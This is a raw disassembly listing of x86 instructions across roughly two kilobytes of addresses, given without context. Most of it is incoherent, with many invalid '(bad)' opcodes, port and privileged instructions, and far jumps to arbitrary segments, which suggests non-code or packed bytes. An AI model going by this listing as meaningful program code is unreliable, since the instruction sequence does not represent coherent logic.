  411b84:	leave  
  411b85:	and    cl,BYTE PTR [esi-0x39]
  411b88:	push   eax
  411b89:	adc    ecx,esi
  411b8b:	cwde   
  411b8c:	xor    BYTE PTR [ecx*4+0x294bccbf],dh
  411b93:	xor    dl,BYTE PTR [ecx+0x67224377]
  411b99:	(bad)  
  411b9b:	sbb    cl,BYTE PTR [ebx+ecx*1]
  411b9e:	leave  
  411b9f:	pop    esp
  411ba0:	inc    ebx
  411ba1:	std    
  411ba2:	fist   WORD PTR [edx+0x34]
  411ba5:	aam    0xe1
  411ba7:	xchg   esi,eax
  411ba8:	mov    bl,0x45
  411baa:	(bad)  
  411bab:	in     al,dx
  411bac:	mov    ebp,0x15474236
  411bb1:	pop    es
  411bb2:	pop    ss
  411bb3:	scas   al,BYTE PTR es:[edi]
  411bb4:	imul   eax,DWORD PTR [esi-0x39b842f2],0xffffff9c
  411bbb:	(bad)  
  411bbc:	push   eax
  411bbd:	pop    esp
  411bbe:	pushf  
  411bbf:	pusha  
  411bc0:	pop    ecx
  411bc1:	pop    ecx
  411bc2:	mov    ch,0xf8
  411bc4:	adc    ebp,ebp
  411bc6:	test   DWORD PTR [esi-0x3e],esi
  411bc9:	xchg   ecx,eax
  411bca:	sbb    BYTE PTR [bx+si+0x28],dh
  411bce:	push   0xa15d7ae6
  411bd3:	xor    al,0xc1
  411bd5:	xrelease xchg BYTE PTR [esi-0x26],bl
  411bd9:	ins    BYTE PTR es:[edi],dx
  411bda:	xchg   DWORD PTR [ecx+0x4ea602a1],edi
  411be0:	jmp    0x482acd47
  411be5:	retf   
  411be6:	jmp    0xaca8:0x40350931
  411bed:	xor    eax,0x3364558e
  411bf2:	sahf   
  411bf3:	sub    eax,0x7eaf98e9
  411bf8:	fpatan 
  411bfa:	loope  0x411bae
  411bfc:	and    ah,al
  411bfe:	pop    ebp
  411bff:	or     esi,DWORD PTR [ebx+eiz*2+0x131cf180]
  411c06:	inc    ebp
  411c07:	mov    edx,0xc045654b
  411c0c:	dec    edx
  411c0d:	push   ss
  411c0e:	push   edi
  411c0f:	mov    ebx,0x837cf153
  411c14:	pop    esi
  411c15:	fcom   DWORD PTR [esi+ebx*2]
  411c18:	loop   0x411c95
  411c1a:	or     bh,bl
  411c1c:	inc    ebp
  411c1d:	rol    al,1
  411c1f:	and    eax,0xe8643af6
  411c24:	aad    0xbc
  411c26:	hlt    
  411c27:	push   es
  411c28:	push   cs
  411c29:	dec    ebx
  411c2a:	das    
  411c2b:	cli    
  411c2c:	mov    dl,0xb
  411c2e:	jae    0x411cac
  411c30:	cli    
  411c31:	mov    ch,0xb9
  411c33:	mov    eax,0xb905a066
  411c38:	inc    edx
  411c39:	aaa    
  411c3a:	pushf  
  411c3b:	xchg   edi,eax
  411c3c:	add    ebx,DWORD PTR [eax]
  411c3e:	mov    eax,0xb21f1e08
  411c43:	test   BYTE PTR [edx],ch
  411c45:	sub    esp,eax
  411c47:	dec    esi
  411c48:	or     ecx,DWORD PTR [edx-0x797b36df]
  411c4e:	push   esp
  411c4f:	pop    ebp
  411c50:	(bad)  
  411c51:	sub    eax,0x2ac79e81
  411c56:	push   esi
  411c57:	fst    st(7)
  411c59:	dec    esi
  411c5a:	cwde   
  411c5b:	lods   eax,DWORD PTR ds:[esi]
  411c5c:	test   BYTE PTR [ebx+0x5aba07e8],dh
  411c62:	pop    esp
  411c63:	imul   eax,DWORD PTR [esi+0x76c8e9dd],0x23
  411c6a:	xchg   edi,eax
  411c6b:	sbb    edi,DWORD PTR [ecx-0x38]
  411c6e:	pop    esp
  411c6f:	push   ecx
  411c70:	bound  edx,QWORD PTR [esi+0x664209a8]
  411c76:	stos   BYTE PTR es:[edi],al
  411c77:	rol    BYTE PTR [edx-0x5e],cl
  411c7a:	sub    BYTE PTR [ecx+0x3e],0x5e
  411c7e:	je     0x411cc9
  411c80:	btr    DWORD PTR [ecx],eax
  411c83:	outs   dx,BYTE PTR ds:[esi]
  411c84:	dec    esp
  411c85:	das    
  411c86:	aad    0xa3
  411c88:	push   0x54
  411c8a:	xchg   ecx,eax
  411c8b:	adc    DWORD PTR [edx],edi
  411c8d:	pushf  
  411c8e:	xchg   esi,eax
  411c8f:	cld    
  411c90:	cmp    dh,BYTE PTR [edx-0x74]
  411c93:	loopne 0x411c39
  411c95:	mov    dh,0xc3
  411c97:	int3   
  411c98:	(bad)  
  411c9a:	sub    al,0x4d
  411c9c:	(bad)  [ecx+0x7]
  411c9f:	push   0x8829c01c
  411ca4:	ds jle 0x411c27
  411ca7:	sub    eax,0x95d9813e
  411cac:	mov    al,0x8b
  411cae:	mov    esp,0xc395f7c6
  411cb3:	fwait
  411cb4:	mov    eax,ds:0x95b47aeb
  411cb9:	stos   DWORD PTR es:[edi],eax
  411cba:	dec    esi
  411cbb:	or     eax,0x6c85d484
  411cc0:	cmp    dh,ah
  411cc2:	cld    
  411cc3:	mov    ds:0x8ef339d3,al
  411cc8:	mov    eax,ds:0xbd21c639
  411ccd:	jp     0x411d32
  411ccf:	sbb    al,0x1a
  411cd1:	push   edx
  411cd2:	mov    ?,WORD PTR [esi+ebx*1-0x590c20fd]
  411cd9:	jg     0x411d00
  411cdb:	or     BYTE PTR [ecx],ah
  411cdd:	outs   dx,DWORD PTR ds:[esi]
  411cde:	int    0xe6
  411ce0:	retf   0x69ab
  411ce3:	retf   
  411ce4:	or     eax,0x5a32f8e4
  411ce9:	stos   DWORD PTR es:[edi],eax
  411cea:	push   edx
  411ceb:	mov    ah,0x9f
  411ced:	or     eax,0x949f14df
  411cf2:	mov    dh,0x9f
  411cf4:	loopne 0x411c8c
  411cf6:	push   0xffffffa4
  411cf8:	div    bl
  411cfa:	es je  0x411caa
  411cfd:	dec    ecx
  411cfe:	adc    BYTE PTR [esi-0x55],bl
  411d01:	or     dl,dl
  411d03:	push   es
  411d04:	and    BYTE PTR [ebx-0x3f],bl
  411d07:	xor    DWORD PTR [eax+0x22],esp
  411d0a:	mov    ebp,0x211b7ef2
  411d0f:	inc    esp
  411d10:	std    
  411d11:	mov    edx,0xac8141b0
  411d16:	mul    DWORD PTR [edx-0x1bb538e3]
  411d1c:	std    
  411d1d:	retf   
  411d1e:	mov    WORD PTR [ebp-0x56234f57],es
  411d24:	jg     0x411d84
  411d26:	pop    ebp
  411d27:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411d28:	mov    ds:0x128a5828,al
  411d2d:	sbb    DWORD PTR [ecx+0x79],0x449124c8
  411d34:	pop    ebx
  411d35:	gs mov al,0x85
  411d38:	pushf  
  411d39:	fs push ds
  411d3b:	mov    bh,0xd2
  411d3d:	inc    ebx
  411d3e:	sub    eax,0x8b812c1a
  411d43:	and    bl,ch
  411d45:	lea    esp,[ebp+0x9]
  411d48:	push   ecx
  411d49:	fcmovnb st,st(1)
  411d4b:	push   edi
  411d4c:	and    al,0x1c
  411d4e:	lods   al,BYTE PTR ds:[esi]
  411d4f:	cmc    
  411d50:	ror    eax,0x2a
  411d53:	sahf   
  411d54:	test   DWORD PTR [ebx*8-0x9c8fe5],edi
  411d5b:	dec    ebx
  411d5c:	ja     0x411d50
  411d5e:	imul   ebp,DWORD PTR [ebp-0x6aa35a76],0xffffff82
  411d65:	mov    cl,0x23
  411d67:	xchg   ebp,eax
  411d68:	loopne 0x411d64
  411d6a:	rol    DWORD PTR gs:[esi],1
  411d6d:	or     eax,0xabc41c4c
  411d72:	out    dx,eax
  411d73:	leave  
  411d74:	in     eax,0x4e
  411d76:	sub    edx,esp
  411d78:	ja     0x411dd9
  411d7a:	pop    edx
  411d7b:	jmp    ecx
  411d7d:	xchg   edi,eax
  411d7e:	xchg   BYTE PTR ds:0x3f8bca2c,bl
  411d84:	in     eax,0x21
  411d86:	(bad)  
  411d87:	cwde   
  411d88:	ror    DWORD PTR [eax+0x642255b2],0x6c
  411d8f:	xor    ah,BYTE PTR [eax-0x6892464]
  411d95:	sub    BYTE PTR [ebp+0x7ff146ff],0x89
  411d9c:	loopne 0x411d95
  411d9e:	gs mov esi,0xe127d906
  411da4:	pushf  
  411da5:	sub    dl,dh
  411da7:	inc    esp
  411da8:	mov    bl,0x3d
  411daa:	outs   dx,BYTE PTR ds:[esi]
  411dab:	mov    al,0xde
  411dad:	jo     0x411e06
  411daf:	sbb    bl,0xe2
  411db2:	cmp    al,0x5c
  411db4:	rol    BYTE PTR [esi],1
  411db6:	sbb    eax,0x8b9c9449
  411dbb:	loop   0x411d91
  411dbd:	inc    ebp
  411dbe:	mul    edx
  411dc0:	xor    esp,edi
  411dc2:	loopne 0x411d8d
  411dc4:	xor    eax,0x31c6bdb7
  411dc9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411dca:	clc    
  411dcb:	stos   DWORD PTR es:[edi],eax
  411dcc:	retf   
  411dcd:	adc    eax,0x69b0005f
  411dd2:	xchg   ecx,ebp
  411dd4:	scas   eax,DWORD PTR es:[edi]
  411dd5:	cmp    eax,0x1183ce5f
  411dda:	mov    ebp,0x681d9ac1
  411ddf:	ins    DWORD PTR es:[edi],dx
  411de0:	shr    DWORD PTR [edx+0x368bbff3],1
  411de6:	ficomp WORD PTR [ecx]
  411de8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411de9:	scas   al,BYTE PTR es:[edi]
  411dea:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411dec:	xchg   esi,eax
  411ded:	ror    edi,cl
  411def:	cs mov dl,0x23
  411df2:	out    dx,al
  411df3:	or     al,BYTE PTR [ebx+0x51c687f7]
  411df9:	dec    esi
  411dfa:	add    al,0xe
  411dfc:	mov    dl,0x28
  411dfe:	addr16 push ds
  411e00:	push   0x23597352
  411e05:	dec    edi
  411e06:	bound  ebx,QWORD PTR [edi-0x7ccb01fa]
  411e0c:	push   ss
  411e0d:	and    al,0xd3
  411e0f:	mov    bh,0x96
  411e11:	popf   
  411e12:	fnstsw WORD PTR [eax+0x77a35811]
  411e18:	and    esp,DWORD PTR [ebp+0x19]
  411e1b:	test   DWORD PTR [eax],esi
  411e1d:	pop    ebx
  411e1e:	rcr    BYTE PTR [esi],0x3e
  411e21:	xchg   edi,eax
  411e22:	dec    ecx
  411e23:	dec    esp
  411e24:	push   ecx
  411e25:	enter  0xe1b2,0xdf
  411e29:	neg    BYTE PTR [ebp+0x4908384]
  411e2f:	fiadd  DWORD PTR [esi+0x23]
  411e32:	dec    edx
  411e33:	pushf  
  411e34:	in     al,0x67
  411e36:	xchg   esi,eax
  411e37:	ret    
  411e38:	mov    bl,0x4f
  411e3a:	and    BYTE PTR [edi+0x64f952c2],0x11
  411e41:	sbb    DWORD PTR [esi+0x56],esp
  411e44:	mov    bl,0x47
  411e46:	xor    eax,0x409fbe71
  411e4b:	pushf  
  411e4c:	adc    al,0x8a
  411e4e:	popf   
  411e4f:	inc    esp
  411e50:	inc    ecx
  411e51:	inc    ebx
  411e52:	xchg   DWORD PTR [ecx-0x73],esp
  411e55:	xchg   esi,eax
  411e56:	call   FWORD PTR [ebx]
  411e58:	aad    0x0
  411e5a:	mov    dl,0xbd
  411e5c:	mov    ds:0x84be0c7e,al
  411e61:	pusha  
  411e62:	pusha  
  411e63:	and    DWORD PTR [esi-0x6fb57180],edi
  411e69:	test   eax,0x1004361b
  411e6e:	jae    0x411e01
  411e70:	imul   ebx,ebp,0xd29b6ad4
  411e76:	clc    
  411e77:	pop    ecx
  411e78:	fisub  DWORD PTR [eax+edi*2]
  411e7b:	loopne 0x411e34
  411e7d:	jb     0x411ee2
  411e7f:	push   cs
  411e80:	push   ss
  411e81:	gs push esi
  411e83:	imul   BYTE PTR [edi]
  411e85:	pop    ecx
  411e86:	sub    BYTE PTR [eax],ch
  411e88:	push   edx
  411e89:	icebp  
  411e8a:	and    bh,BYTE PTR [edx]
  411e8c:	xchg   esp,eax
  411e8d:	outs   dx,BYTE PTR ds:[esi]
  411e8e:	inc    eax
  411e8f:	push   ebx
  411e90:	stos   DWORD PTR es:[edi],eax
  411e91:	and    BYTE PTR [edx+eax*8-0x61],cl
  411e95:	std    
  411e96:	lods   al,BYTE PTR ds:[esi]
  411e97:	adc    DWORD PTR [edi],ebp
  411e99:	adc    cl,BYTE PTR [edi-0x298bb16]
  411e9f:	pop    ecx
  411ea0:	addr16 push eax
  411ea2:	or     BYTE PTR [ebx+0x5b],ch
  411ea5:	jmp    0xf204:0xf80c865f
  411eac:	or     dh,BYTE PTR [esp+esi*4]
  411eaf:	(bad)  
  411eb0:	nop
  411eb1:	mov    esi,0xa96ec154
  411eb6:	retf   0x62c8
  411eb9:	xchg   edx,eax
  411eba:	or     BYTE PTR [ebx-0x1f],ch
  411ebd:	les    esi,FWORD PTR ds:0x4960a12a
  411ec3:	lock adc eax,0x523f3fbd
  411ec9:	shr    BYTE PTR [eax+0x4b],0xcc
  411ecd:	bound  edi,QWORD PTR [eax+0xecbc567]
  411ed3:	or     ebx,DWORD PTR [edx-0x797ec719]
  411ed9:	mov    edx,DWORD PTR [eax-0x10]
  411edc:	cmp    al,BYTE PTR [edx+0x15]
  411edf:	or     al,0xd3
  411ee1:	xchg   edi,eax
  411ee2:	aam    0x39
  411ee4:	push   es
  411ee5:	cli    
  411ee6:	packuswb mm1,QWORD PTR [esi-0x60]
  411eea:	out    0x81,al
  411eec:	(bad)  
  411eed:	and    BYTE PTR [edx],ch
  411eef:	xchg   ebp,eax
  411ef0:	pushf  
  411ef1:	lock jne 0x411e7e
  411ef4:	inc    esp
  411ef5:	sbb    BYTE PTR [ebx],cl
  411ef7:	xor    cl,BYTE PTR [eax+0x4a]
  411efa:	pinsrw mm5,ebx,0x70
  411efe:	iret   
  411eff:	xor    al,0x79
  411f01:	jns    0x411f25
  411f03:	fisttp DWORD PTR [ebx]
  411f05:	fst    QWORD PTR [edx]
  411f07:	(bad)  
  411f08:	dec    ebx
  411f09:	mov    DWORD PTR [esi+0x39194074],ebp
  411f0f:	sbb    dh,bh
  411f11:	fldenv [ebx-0x65]
  411f14:	or     DWORD PTR [esi-0x4a],esp
  411f17:	or     bh,BYTE PTR [edi+0x3f3fdb4d]
  411f1d:	dec    ecx
  411f1e:	int3   
  411f1f:	gs adc al,0xf5
  411f22:	pusha  
  411f23:	mov    ebp,0x6b61ccd7
  411f28:	rcr    BYTE PTR [edx+0x3e],0x16
  411f2c:	repz dec eax
  411f2e:	(bad)  
  411f2f:	enter  0xd303,0x16
  411f33:	sti    
  411f34:	jne    0x411f5b
  411f36:	mov    ebx,0x32d02a80
  411f3b:	mov    al,0xf9
  411f3d:	or     eax,0x905bd00c
  411f42:	dec    ebx
  411f43:	adc    BYTE PTR [eax+0xf],ch
  411f46:	jb     0x411f5c
  411f48:	rcr    DWORD PTR [edx+0x51],0x68
  411f4c:	sbb    bl,dl
  411f4e:	mov    esp,0xe39237c8
  411f53:	dec    ebx
  411f54:	outs   dx,DWORD PTR ds:[esi]
  411f55:	mov    eax,0xe3bd47d5
  411f5a:	dec    ebx
  411f5b:	or     al,0x92
  411f5d:	pop    ecx
  411f5e:	aas    
  411f5f:	inc    ecx
  411f60:	mov    ah,0xe
  411f62:	mov    gs,esi
  411f64:	mov    esi,ecx
  411f66:	push   edx
  411f67:	test   BYTE PTR [edx+0x2b],0xe7
  411f6b:	lahf   
  411f6c:	(bad)  
  411f6d:	aaa    
  411f6e:	loopne 0x411f6c
  411f70:	cmp    al,0xe
  411f72:	ins    DWORD PTR es:[edi],dx
  411f73:	hlt    
  411f74:	scas   eax,DWORD PTR es:[edi]
  411f75:	inc    ebx
  411f76:	push   0xffdc13b3
  411f7b:	mov    esi,esp
  411f7d:	push   ebx
  411f7e:	scas   al,BYTE PTR es:[edi]
  411f7f:	pop    esi
  411f80:	clc    
  411f81:	fiadd  WORD PTR [ecx]
  411f83:	out    0x19,eax
  411f85:	mov    WORD PTR [ebx-0x35],es
  411f88:	daa    
  411f89:	adc    ebx,DWORD PTR [eax-0x24]
  411f8c:	bound  ebp,QWORD PTR [edi]
  411f8e:	sar    dh,cl
  411f90:	dec    edi
  411f91:	push   esp
  411f92:	mov    eax,0xf65dedd6
  411f97:	inc    edx
  411f98:	or     DWORD PTR [edx+0x4b],edx
  411f9b:	lds    esi,FWORD PTR [edi+0x44c5bf4f]
  411fa1:	sbb    ecx,DWORD PTR [eax]
  411fa3:	mov    edx,0xc83ea0b3
  411fa8:	bound  eax,QWORD PTR ds:0xfcaca7c2
  411fae:	jno    0x411f43
  411fb0:	bound  ebx,QWORD PTR [ebx+0x14]
  411fb3:	adc    cl,BYTE PTR [esi]
  411fb5:	mov    bh,0x5b
  411fb7:	xor    edx,esp
  411fb9:	inc    edi
  411fba:	ins    BYTE PTR es:[edi],dx
  411fbb:	cld    
  411fbc:	dec    esp
  411fbd:	adc    BYTE PTR [eax+0x56],cl
  411fc0:	outs   dx,DWORD PTR ds:[esi]
  411fc1:	cmp    BYTE PTR [esi],0x77
  411fc4:	ja     0x412009
  411fc6:	mov    ch,0x25
  411fc8:	pushf  
  411fc9:	inc    ecx
  411fca:	add    DWORD PTR [edx-0x74001dfc],edx
  411fd0:	xchg   BYTE PTR [edi+0x4e27660d],dl
  411fd6:	shr    BYTE PTR [ecx+0x4479de9e],0xe2
  411fdd:	mov    ecx,0xe05902ba
  411fe2:	test   BYTE PTR ds:0xe247b6d0,bl
  411fe8:	mov    dh,0x74
  411fea:	lahf   
  411feb:	jmp    0xfd7e:0x4be0a894
  411ff2:	cmp    DWORD PTR [eax+0x72b4b945],edx
  411ff8:	xchg   esp,eax
  411ff9:	jg     0x41200f
  411ffb:	loope  0x411ffe
  411ffd:	popf   
  411ffe:	out    dx,al
  411fff:	lods   al,BYTE PTR ds:[esi]
  412000:	add    esp,edx
  412002:	pushf  
  412003:	sahf   
  412004:	and    BYTE PTR [edx-0x1fbb3282],ah
  41200a:	xor    al,BYTE PTR [edx+ecx*8-0x155ba48c]
  412011:	jle    0x412025
  412013:	inc    edx
  412014:	pop    ebx
  412015:	ss stc 
  412017:	scas   al,BYTE PTR es:[edi]
  412018:	retf   0xc84d
  41201b:	xchg   DWORD PTR [ebx+edi*1+0x467e97fb],eax
  412022:	push   esp
  412023:	jmp    0x4120a2
  412025:	pop    es
  412026:	(bad)  
  412027:	test   DWORD PTR [ecx],0xdc5d3f66
  41202d:	daa    
  41202e:	sbb    eax,0x62809474
  412033:	jns    0x4120a8
  412035:	sbb    al,0x37
  412037:	mov    eax,ds:0xf9c7abcf
  41203c:	mov    ebp,es
  41203e:	adc    al,0x92
  412040:	outs   dx,BYTE PTR ds:[esi]
  412041:	mov    fs,WORD PTR [edi-0x6c]
  412044:	or     al,0xc4
  412046:	shl    DWORD PTR [ecx-0x737bae66],1
  41204c:	dec    ebp
  41204d:	rol    DWORD PTR [eax],0x52
  412050:	pushf  
  412051:	dec    esp
  412052:	push   ecx
  412053:	inc    ebp
  412054:	jmp    0x1267:0x1704c917
  41205b:	mov    esp,0xc35b3a21
  412060:	fs in  al,dx
  412062:	add    al,BYTE PTR [esi]
  412064:	inc    edi
  412065:	adc    al,0x9a
  412067:	aas    
  412068:	adc    ch,BYTE PTR [ecx+0x68a4285c]
  41206e:	xor    BYTE PTR [ecx-0x64423a8c],bh
  412074:	xor    ebx,ebp
  412076:	inc    DWORD PTR [ecx+eax*4-0x2e]
  41207a:	sub    al,ch
  41207c:	push   edi
  41207d:	push   ebp
  41207e:	test   DWORD PTR [eax+0x4c],ebp
  412081:	mov    bl,0xdd
  412083:	adc    eax,0x301242b
  412088:	enter  0x361b,0x3b
  41208c:	(bad)  
  41208d:	sub    DWORD PTR [edi-0x41cb2907],esi
  412093:	popf   
  412094:	addr16 pushf 
  412096:	push   es
  412097:	push   edi
  412098:	mov    esp,0x5db0caae
  41209d:	add    esp,DWORD PTR [edx]
  41209f:	mov    edi,0x469c715e
  4120a4:	mov    ebp,DWORD PTR [esi-0x2db706e7]
  4120aa:	icebp  
  4120ab:	aas    
  4120ac:	mov    WORD PTR [ebp+0xf],es
  4120af:	and    edi,DWORD PTR [eax+0x53dc2d12]
  4120b5:	jo     0x4120c0
  4120b7:	out    dx,eax
  4120b8:	aaa    
  4120b9:	or     al,0x14
  4120bb:	ss push ss
  4120bd:	jg     0x4120c5
  4120bf:	sub    bh,BYTE PTR [ebx-0x5662144a]
  4120c5:	adc    BYTE PTR [ebx-0x52e2d78a],0xa6
  4120cc:	jg     0x412081
  4120ce:	aam    0x25
  4120d0:	cmp    DWORD PTR [ebx-0x17d6a1db],0xe67129bf
  4120da:	push   0x3c
  4120dc:	pop    ebp
  4120dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4120de:	pop    edi
  4120df:	cmc    
  4120e0:	(bad)  
  4120e1:	and    bh,bl
  4120e3:	mov    ah,0x43
  4120e5:	push   es
  4120e6:	mov    bh,0xd5
  4120e8:	sub    DWORD PTR [esi],ecx
  4120ea:	jae    0x412096
  4120ec:	add    al,0xf4
  4120ee:	pop    eax
  4120ef:	pushf  
  4120f0:	ds inc esi
  4120f2:	imul   esp,esp,0x64
  4120f5:	imul   BYTE PTR cs:[esi]
  4120f8:	popf   
  4120f9:	mov    esi,DWORD PTR [edi+0x68]
  4120fc:	and    bh,BYTE PTR [edx+0x1cf64ba5]
  412102:	rcr    BYTE PTR [esi-0x448cfc6f],cl
  412108:	or     edx,esi
  41210a:	cmp    edi,edx
  41210c:	xchg   BYTE PTR [ebx-0x3c],dh
  41210f:	fimul  DWORD PTR ds:0xf77201d2
  412115:	lds    edx,FWORD PTR [edi-0x12]
  412118:	push   edi
  412119:	aam    0xe1
  41211b:	jecxz  0x4120df
  41211d:	icebp  
  41211e:	jbe    0x4120ed
  412120:	or     eax,0x1d1371ad
  412125:	repz shl bx,cl
  412129:	pop    ecx
  41212a:	jne    0x412117
  41212c:	xor    BYTE PTR [ebx+ebp*1],al
  41212f:	je     0x412154
  412131:	je     0x4120f6
  412133:	jne    0x4120e6
  412135:	rcr    BYTE PTR [edx+0x1f],cl
  412138:	cmp    eax,0x2be32b36
  41213d:	pop    esi
  41213e:	fabs   
  412140:	out    0x85,al
  412142:	adc    eax,0xdf9405dd
  412147:	xchg   BYTE PTR [esi-0x64],ch
  41214a:	mov    WORD PTR [ebx-0x40],?
  41214d:	(bad)  
  41214e:	sbb    esp,DWORD PTR [esi]
  412150:	xchg   ecx,eax
  412151:	xor    al,0x14
  412153:	jmp    0xb87b:0x2c7abea3
  41215a:	dec    ebp
  41215b:	dec    ecx
  41215c:	xchg   esi,eax
  41215d:	in     al,dx
  41215e:	sar    DWORD PTR [eax+0x34],1
  412161:	sbb    ch,BYTE PTR [ecx]
  412163:	cli    
  412164:	daa    
  412165:	stos   DWORD PTR es:[edi],eax
  412166:	or     al,BYTE PTR [ebx+ecx*2]
  412169:	std    
  41216a:	pop    es
  41216b:	push   0xffffff83
  41216d:	adc    BYTE PTR [esi-0xb],dh
  412170:	adc    bh,BYTE PTR [esi]
  412172:	mov    ss:0xf4d4ab18,eax
  412178:	pushf  
  412179:	sub    DWORD PTR [ebx-0x13],esp
  41217c:	adc    ch,BYTE PTR [eax*4-0x7fbd40b7]
  412183:	push   ebp
  412184:	stos   DWORD PTR es:[edi],eax
  412185:	ret    0x96f1
  412188:	inc    ebp
  412189:	cld    
  41218a:	daa    
  41218b:	sub    eax,0x4982d313
  412190:	jle    0x4121d2
  412192:	test   al,dh
  412194:	pop    ss
  412195:	jmp    0x41220f
  412197:	gs leave 
  412199:	dec    ebx
  41219a:	jb     0x41213a
  41219c:	pop    esp
  41219e:	daa    
  41219f:	pop    edi
  4121a0:	inc    edi
  4121a1:	or     edi,esi
  4121a3:	(bad)  
  4121a4:	jns    0x412140
  4121a6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4121a7:	sub    dh,BYTE PTR [ebx-0x4bf9999a]
  4121ad:	outs   dx,BYTE PTR ds:[esi]
  4121ae:	fiadd  DWORD PTR [esi+0x73b881f2]
  4121b4:	mov    esp,es
  4121b6:	inc    esp
  4121b7:	mov    al,0xe5
  4121b9:	out    0xba,al
  4121bb:	cli    
  4121bc:	jle    0x4121e9
  4121be:	jp     0x4121e2
  4121c0:	call   0xbda9f515
  4121c5:	cmp    al,dh
  4121c7:	jo     0x412246
  4121c9:	imul   edx,DWORD PTR [edx+0x15],0x6706cf17
  4121d0:	sub    bl,ah
  4121d2:	dec    edi
  4121d3:	out    0xe2,eax
  4121d5:	fnstsw WORD PTR [ebx-0x27]
  4121d8:	cmp    DWORD PTR [edi+0x79ffdc3a],ecx
  4121de:	(bad)  
  4121df:	mov    al,ds:0x318e58f7
  4121e4:	push   ss
  4121e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4121e6:	and    ch,BYTE PTR [edi]
  4121e8:	push   ebx
  4121e9:	jecxz  0x412177
  4121eb:	retf   
  4121ec:	inc    edi
  4121ed:	int3   
  4121ee:	(bad)  
  4121ef:	fld    QWORD PTR [esi-0x43]
  4121f2:	out    dx,eax
  4121f3:	imul   ecx,DWORD PTR [ebx],0x819d43da
  4121f9:	add    al,0x43
  4121fb:	(bad)  
  4121fc:	(bad)  
  4121fe:	fsub   QWORD PTR [esi]
  412200:	mov    eax,DWORD PTR [edx+ecx*2-0x25]
  412204:	xchg   ecx,eax
  412205:	jae    0x412273
  412207:	fwait
  412208:	imul   ebx,ecx,0xfb47eff0
  41220e:	cdq    
  41220f:	sbb    al,0x7f
  412211:	add    eax,0xffffffbb
  412214:	cmp    eax,0x8b0a57a9
  412219:	add    dl,BYTE PTR [ebx+0x30e1b619]
  41221f:	cmp    eax,DWORD PTR [esi-0x5e4e1a76]
  412225:	and    eax,0xa2411742
  41222a:	and    BYTE PTR [esp+eax*8],al
  41222d:	push   ebp
  41222e:	dec    edi
  41222f:	aad    0x71
  412231:	push   es
  412232:	mov    cl,0x71
  412234:	push   esi
  412235:	fdiv   QWORD PTR [ebx]
  412237:	xlat   BYTE PTR ds:[ebx]
  412238:	mov    al,0xbc
  41223a:	not    edx
  41223c:	xor    DWORD PTR [edi+esi*2],esp
  41223f:	(bad)  
  412240:	pop    edx
  412241:	lahf   
  412242:	enter  0x15c4,0xca
  412246:	js     0x412239
  412248:	cmc    
  412249:	imul   edi,DWORD PTR [edx-0x5773aa29],0x2e
  412250:	xor    BYTE PTR [esi+0x32],cl
  412253:	add    al,0x9
  412255:	in     al,dx
  412256:	or     BYTE PTR [edx],bl
  412258:	(bad)  
  412259:	(bad)  
  41225a:	call   0x867109ac
  41225f:	adc    BYTE PTR ds:0x29cc712e,0xd1
  412266:	add    esp,ecx
  412268:	jmp    0x713782aa
  41226d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41226e:	call   0x4e17:0xa3979835
  412275:	xlat   BYTE PTR ds:[ebx]
  412276:	jmp    0xf981d131
  41227b:	mov    ecx,DWORD PTR [ebx-0x1414f88f]
  412281:	ins    BYTE PTR es:[edi],dx
  412282:	jno    0x41223c
  412284:	aas    
  412285:	int3   
  412286:	jno    0x41223b
  412288:	std    
  412289:	lar    ebx,WORD PTR [eax-0x10baa299]
  412290:	add    al,0xa
  412292:	add    esi,DWORD PTR [eax+0x335f55b5]
  412298:	push   ds
  412299:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41229a:	push   ds
  41229b:	jnp    0x4122c1
  41229d:	jb     0x4122ce
  41229f:	cdq    
  4122a0:	dec    edx
  4122a1:	enter  0xa022,0x38
  4122a5:	fnsave [ecx-0x10cd46e5]
  4122ab:	jae    0x4122ab
  4122ad:	(bad)  
  4122ae:	icebp  
  4122af:	jo     0x4122ac
  4122b1:	push   ds
  4122b2:	lods   eax,DWORD PTR ds:[esi]
  4122b3:	sub    ch,BYTE PTR [eax-0x55983179]
  4122b9:	dec    esp
  4122ba:	bt     DWORD PTR [esi+0x26],esp
  4122be:	ins    DWORD PTR es:[edi],dx
  4122bf:	mov    al,0xc4
  4122c1:	pop    edx
  4122c2:	(bad)  
  4122c4:	mov    ds,edi
  4122c6:	jg     0x4122fc
  4122c8:	mov    ds:0xd13bc9c,al
  4122cd:	push   esi
  4122ce:	sub    dh,BYTE PTR [ecx]
  4122d0:	and    eax,0xd349ea3e
  4122d5:	or     DWORD PTR [eax],ebx
  4122d7:	aas    
  4122d8:	lock add ecx,edi
  4122db:	es pushf 
  4122dd:	xchg   ecx,eax
  4122de:	dec    ebp
  4122df:	out    0xf6,al
  4122e1:	je     0x4122f3
  4122e3:	or     DWORD PTR [ecx+0x33],edi
  4122e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4122e7:	mov    ecx,0xd441f3c3
  4122ec:	push   eax
  4122ed:	popa   
  4122ee:	push   ebx
  4122ef:	sub    DWORD PTR [eax+0x3c],esp
  4122f2:	add    ebx,DWORD PTR [ecx]
  4122f4:	mov    ds:0xf075ccbb,al
  4122f9:	cli    
  4122fa:	and    BYTE PTR [edx+0x38],al
  4122fd:	mov    bh,0xa7
  4122ff:	mov    eax,ds:0xbd5ea8ed
  412304:	sub    BYTE PTR [edx],cl
  412306:	test   DWORD PTR [esp+ecx*8+0x1a3a342c],ecx
  41230d:	out    0x9f,eax
  41230f:	icebp  
  412310:	xchg   ebx,eax
  412311:	loope  0x4122e0
  412313:	pop    edi
  412314:	sbb    BYTE PTR [ebx+0x5c468cb4],ch
  41231a:	sub    ah,BYTE PTR [ebp+0x63bd01a6]
  412320:	mov    al,0x44
  412322:	loopne 0x4122fc
  412324:	mov    ch,0x2
  412326:	mov    ds:0x3d98d35b,eax
  41232b:	pop    ebx
  41232c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41232d:	adc    DWORD PTR [edi+0xa],0xa7e81375
  412334:	cli    
